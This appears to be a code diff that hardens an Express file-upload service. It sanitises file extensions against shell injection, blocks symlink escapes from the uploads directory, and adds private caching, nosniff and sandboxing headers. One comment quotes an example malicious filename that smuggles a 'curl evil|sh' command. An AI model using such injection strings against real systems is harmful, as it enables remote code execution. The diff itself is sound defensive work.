@@ -1,7 +1,7 @@
 import type { Express } from 'express';
 import { Router } from 'express';
 import * as fs from 'fs';
-import { access, readdir, stat, unlink } from 'fs/promises';
+import { lstat, readdir, realpath, stat, unlink } from 'fs/promises';
 import * as mime from 'mime-types';
 import multer from 'multer';
 import * as os from 'os';
@@ -37,8 +37,11 @@ const storage = multer.diskStorage({
     file: Express.Multer.File,
     cb: (error: Error | null, filename: string) => void
   ) => {
-    // Generate unique filename with original extension
-    const uniqueName = `${uuidv4()}${path.extname(file.originalname)}`;
+    // Unique filename keeping the original extension only when it's a plain one: the path
+    // is typed into the user's shell, and extname() of "x.pdf;curl evil|sh" is ".pdf;curl
+    // evil|sh".
+    const ext = path.extname(file.originalname);
+    const uniqueName = `${uuidv4()}${/^\.[A-Za-z0-9]{1,16}$/.test(ext) ? ext : ''}`;
     cb(null, uniqueName);
   },
 });
@@ -133,15 +136,20 @@ export function createFileRoutes(): Router {
         return res.status(400).json({ error: 'Invalid file path' });
       }
 
-      // Check if file exists
+      // Only regular files that really live in the uploads directory: a symlink placed there
+      // must not expose files elsewhere.
+      let stats: fs.Stats;
       try {
-        await access(filePath);
+        const link = await lstat(filePath);
+        const real = await realpath(filePath);
+        const realUploadsDir = await realpath(UPLOADS_DIR);
+        if (!link.isFile() || path.dirname(real) !== realUploadsDir) {
+          return res.status(404).json({ error: 'File not found' });
+        }
+        stats = await stat(real);
       } catch {
         return res.status(404).json({ error: 'File not found' });
       }
-
-      // Get file stats for content length
-      const stats = await stat(filePath);
 
       // Use mime-types library to determine content type
       // It automatically falls back to 'application/octet-stream' for unknown types
@@ -149,7 +157,11 @@ export function createFileRoutes(): Router {
 
       res.setHeader('Content-Type', contentType);
       res.setHeader('Content-Length', stats.size);
-      res.setHeader('Cache-Control', 'public, max-age=86400'); // Cache for 1 day
+      // Private: uploads can be personal screenshots; no shared caches.
+      res.setHeader('Cache-Control', 'private, max-age=86400');
+      res.setHeader('X-Content-Type-Options', 'nosniff');
+      // An uploaded .html/.svg opened from here must not run as this origin.
+      res.setHeader('Content-Security-Policy', "default-src 'none'; sandbox");
 
       // Stream the file
       const fileStream = fs.createReadStream(filePath);
